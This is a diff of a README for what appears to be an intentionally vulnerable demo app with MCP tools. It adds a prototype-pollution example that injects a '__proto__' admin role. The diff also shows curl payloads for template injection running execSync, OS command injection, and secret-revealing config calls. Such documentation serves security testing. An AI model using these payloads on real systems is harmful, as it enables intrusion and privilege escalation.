@@ -1236,6 +1236,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
   - **Server-Side JavaScript Injection via process_numbers** - The `process_numbers` proxies `/api/process_numbers` and executes arbitrary JavaScript from the `processing_expression` expression in server context.
   - **XML External Entity via get_metadata** - The `get_metadata` proxies `/api/metadata` and processes attacker-controlled XML with external entities enabled (same vulnerability class as `/api/metadata`).
   - **Broken Access Control via search_users** - The `search_users` proxies `/api/users/search/:name` and returns `application/json` search results.
+  - **Prototype Pollution via query_audit** - The `query_audit` tool returns top-level `name`/`email`/`username`/`phone` fields plus everything inside attacker-controlled `__proto__` payload fields.
   - **OS Command Injection via spawn_process** - The `spawn_process` executes arbitrary operating system commands through MCP (same vulnerability class as `/api/spawn`) and streams progress over event-stream.
   - **Authentication and Session Management** - The `/api/mcp` endpoint supports optional authentication and per-client session tracking:
 
@@ -1258,6 +1259,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
     - `spawn_process` responds as `text/event-stream`:
       `event: notification` + `data: <progress-payload>` before execution and every ~5 seconds while running, partial command output via `event: notification` + `data: <partial-output-payload>`, then `event: message` + `data: <json-rpc-payload>`.
     - `search_users` proxies `/api/users/search/:name` and returns `application/json` data.
+    - `query_audit` returns top-level `name`/`email`/`username`/`phone` plus all fields from `payload.__proto__` as JSON.
 
   - **MCP Tool/Resource List (Quick Reference)**:
 
@@ -1405,7 +1407,36 @@ Full configuration & usage examples can be found in our [demo project](https://g
          }'
        ```
 
-    7. `spawn_process` (admin only)  
+    7. `query_audit` (public)  
+       Vulnerability: **Prototype Pollution** via attacker-controlled `__proto__` object fields.  
+       Example:
+
+       ```bash
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "tools/call",
+           "params": {
+            "name": "query_audit",
+            "arguments": {
+              "payload": {
+                "name": "Bob",
+                "email": "bob@example.com",
+                "role": "admin",
+                "__proto__": {
+                  "foo": "111",
+                  "status": "222"
+                }
+              }
+            }
+          },
+         "id": 9
+         }'
+       ```
+
+    8. `spawn_process` (admin only)  
        Vulnerability: **OS Command Injection** with progress notifications over SSE.  
        Example:
 
@@ -1422,7 +1453,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
               "command": "ping -c 4 127.0.0.1"
             }
           },
-          "id": 9
+          "id": 10
          }'
        ```
 
@@ -1433,7 +1464,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
        - `event: notification` with method `notifications/partial_output` for stdout/stderr chunks
        - `event: message` containing final JSON-RPC tool result
 
-    8. `get_config` (admin only)  
+    9. `get_config` (admin only)  
        Vulnerability: **Sensitive Data Exposure** (returns app configuration including secrets when allowed).  
        Example (admin-authenticated MCP session):
 
@@ -1461,7 +1492,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
                "include_sensitive": true
              }
            },
-           "id": 10
+           "id": 11
          }'
        ```
 
@@ -1648,7 +1679,34 @@ Full configuration & usage examples can be found in our [demo project](https://g
 
      This payload proxies `/api/users/search/:name` and returns JSON user search results.
 
-  8. **OS Command Injection via spawn_process**:
+  8. **Prototype Pollution via query_audit**:
+
+     ```bash
+     curl "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "tools/call",
+         "params": {
+           "name": "query_audit",
+           "arguments": {
+             "payload": {
+               "name": "Bob",
+               "email": "bob@example.com",
+               "__proto__": {
+                 "role": "admin"
+               }
+             }
+           }
+         },
+         "id": 9
+       }'
+     ```
+
+     This payload returns only top-level `name`/`email`/`username`/`phone` fields and all fields under `payload.__proto__`.
+
+  9. **OS Command Injection via spawn_process**:
 
      ```bash
      curl -N "${BASE}/api/mcp" -X POST \
@@ -1663,32 +1721,32 @@ Full configuration & usage examples can be found in our [demo project](https://g
              "command": "uname -a"
            }
          },
-         "id": 9
+         "id": 10
        }'
      ```
 
      Response is streamed as SSE and ends with an `event: message` JSON-RPC payload containing command output.
 
-  9. **Server-Side Template Injection via render**:
+  10. **Server-Side Template Injection via render**:
 
-     ```bash
-     curl "${BASE}/api/mcp" -X POST \
-       -H 'Content-Type: application/json' \
-       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
-       -d '{
-         "jsonrpc": "2.0",
-         "method": "tools/call",
-         "params": {
-           "name": "render",
-           "arguments": {
-             "numbers": [1],
-             "template": "{{= global.process.mainModule.require('\''child_process'\'').execSync('\''ls -la'\'') }}"
-           }
-         },
-         "id": 10
-       }'
-     ```
+  ```bash
+  curl "${BASE}/api/mcp" -X POST \
+    -H 'Content-Type: application/json' \
+    -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+    -d '{
+      "jsonrpc": "2.0",
+      "method": "tools/call",
+      "params": {
+        "name": "render",
+        "arguments": {
+          "numbers": [1],
+          "template": "{{= global.process.mainModule.require('\''child_process'\'').execSync('\''ls -la'\'') }}"
+        }
+      },
+      "id": 11
+    }'
+  ```
 
-     This payload executes arbitrary system commands through the template injection vulnerability.
+  This payload executes arbitrary system commands through the template injection vulnerability.
 
   </details>
